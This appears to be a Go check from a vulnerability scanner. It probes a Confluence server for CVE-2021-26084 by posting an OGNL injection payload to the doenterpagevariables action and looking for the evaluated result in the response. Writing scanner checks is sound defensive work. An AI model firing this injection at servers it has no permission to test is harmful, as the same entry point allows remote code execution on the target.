package confluence

import (
	"Predator/pkg/utils"
	"strings"
)

func CVE_2021_26084(u string) bool {
	if req, err := utils.HttpRequset(u+"/pages/doenterpagevariables.action", "POST", "queryString=vvv\\u0027%2b#{342*423}%2b\\u0027ppp", false, nil); err == nil {
		if strings.Contains(req.Body, "342423") {
			return true
		}
	}
	return false
}
